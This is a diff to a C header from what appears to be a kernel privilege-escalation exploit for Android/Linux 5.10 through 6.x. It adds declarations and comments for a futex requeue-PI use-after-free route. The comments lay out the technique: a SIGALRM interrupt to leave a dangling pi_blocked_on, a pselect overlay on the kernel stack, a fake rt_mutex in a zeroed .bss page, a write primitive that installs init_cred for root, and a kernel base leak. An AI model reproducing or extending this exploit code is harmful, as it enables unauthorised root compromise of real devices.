@@ -209,6 +209,41 @@ void reset_main_route_state(void);
 int run_main_route_threads(void);
 void set_pselect_write_mode(uintptr_t target, int mode);
 
+/* Per-target kernel image virtual base (0 in the offsets entry falls back to
+ * target.h KIMAGE_TEXT_BASE). 5.10/android12 maps the image at
+ * 0xffffffc008000000 while 6.1+/6.6/6.12 use 0xffffffc080000000. */
+uintptr_t active_image_text_base(void);
+
+/* ---- 5.10 / eqs armed slide route (src/core/slide_eqs.c) -------------------
+ * The compact (6.1) and rb_node (6.6) routes arm the UAF through the caller's
+ * own run_main_route_threads() and a reclaimed-skb fake rt_mutex. eqs 5.10
+ * needs the standalone route proven in eqs_source/src/slide.c: a SIGALRM
+ * interrupt during FUTEX_WAIT_REQUEUE_PI (arming the dangling pi_blocked_on),
+ * a pselect overlay on the waiter's kernel stack, and a ZEROED .bss scratch
+ * page as the fake rt_mutex (the payload-page fake_lock never lands on eqs and
+ * the walk then spins on a garbage wait_lock under IRQs-off -> watchdog).
+ * slide_override_* replace overlay words 0/1/2/7 for one armed run:
+ *   shape 0 (tree_left = target, tree_right = 0) => *(target) = value
+ *                                                  *(value + 8) = target
+ *   shape 1 (tree_left = 0, tree_right = value)  => *(value) = target-8
+ *                                                  *(target) = value
+ * Only shape 0 is used: with value = init_cred it installs the cred and its
+ * collateral lands on init_cred+8 (gid/suid), leaving uid/euid 0. */
+extern int slide_override_active;
+extern uintptr_t slide_override_w0;
+extern uintptr_t slide_override_w1;
+extern uintptr_t slide_override_w2;
+extern uintptr_t slide_override_lock;
+/* 5.10 flat waiter->prio used by the pselect overlay (130 on eqs). */
+extern uint64_t g_eqs_waiter_prio;
+
+int slide_eqs_is_active(void);
+uintptr_t slide_zero_slot(int idx);
+int slide_child_arm_and_run(void);
+uint64_t slide_read_stext(void);
+int slide_leak_kernel_base(void);
+int slide_eqs_root_stage(void);
+
 #include "runtime_struct_offsets.h"
 
 #endif
